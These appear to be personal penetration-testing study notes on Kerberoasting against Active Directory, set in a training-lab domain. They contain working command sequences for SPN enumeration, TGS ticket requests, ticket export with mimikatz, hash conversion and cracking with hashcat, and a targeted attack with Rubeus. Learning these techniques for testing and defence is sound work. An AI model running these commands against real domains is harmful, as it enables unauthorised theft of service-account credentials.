-- -
This vector is centered around Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account. Any domain user can (theoretically) request a Kerberos ticket for said SPN as long as in the same domain or if allowed through a trust relationship w/ another domain. 

The Kerberos ticket itself doesn't grant us access to the Service Account, but the ticket is encrypted w/ the Service Account's NTLM Hash, so you can extract this and crack it to get the cleartext password of the Service Account, or run a PassTheHash attack with said hash.

*Note: Obtaining a TGS Ticket from Kerberos does not guarantee you a set of valid credentials as the ticket must be cracked. TGS tickets take longer to crack than say normal NTLM hashes, so if a strong password is used, you may not get a valid set of credentials.*

You can find the original talk that displayed this prominent vector to the world [here](https://www.youtube.com/watch?v=PUyhlN-E5MU)

#### Prereqs 
1. One of the following: 
	- Domain User Credentials 
	- Domain User NTLM Hash
	- A shell in the context of a domain user
	- A SYSTEM shell on domain joined computer
	- A Root shell on a domain joined computer
2. The IP/hostname of a DC we can query.
## Linux
### Impacket
[[Hacking Scratch/Tools/Active Directory/Impacket/GetUserSPNs]]
![[Hacking Scratch/Tools/Active Directory/Impacket/GetUserSPNs#^d1421f]]
[[Hacking Scratch/Tools/Passwords/Hashcat]]
![[Hacking Scratch/Tools/Passwords/Hashcat#^88073c]]
## Windows
#### PowerView
[[PowerView (depricated)|PowerView]]
![[PowerView (depricated)#^2c6ed0]]
#### "Manual" method
###### On windows box
```powershell
# Dump available SPNs to user you are logged in as
setspn.exe -Q */*

# Request TGs for specific user and dump to memory
# the ArgumentList value is derived from above output
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Request TGS for all SPNs avaialable
# will pull everything, including computer accounts so it's not very efficient
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# Dump TGS(s) from memory w/ mimikatz
# should output to file and tell you it's location
mimikatz.exe
base64 /out:true # optional, may make it easier or harder to file transfer depending
kerberos::list /export
```
###### On Linux box
File transfer the export to you Linux box
```bash
# You can crack the kirbi file output if you did NOT use the base64 line above
# Otherwise, you need to get toe base64 blob to your cracking rig and do the following (commands are in bash). The following command will remove new lines and white spaces from the blob leaving a base64 encoded string representation of the .kirbi file.
echo "<base64 blob>" | tr -d \\n

# put string in "encoded_file", then use following line to decode the string
# and output to final .kirbi file
cat encoded_file | base64 -d > sqldev.kirbi

# Download this kirbi2john file:
wget https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py

# run it
python2.7 kirbi2john.py sqldev.kirbi

# format for hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# crack like normal
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlist/rockyou.txt
```

#### Targeted Kerberoast
The vector here is that we have access to an account that can create a fake SPN, we then just use that and another user we want to take control of to launch a kerberoast attack and get their credentials.
**Create Fake SPN**
![[PowerView (depricated)#^ec631e]]
**Kerberoast it**
For other examples, check [[Rubeus|here]]
```pwoershell
.\Rubeus.exe kerberoast /user:<username> /nowrap
```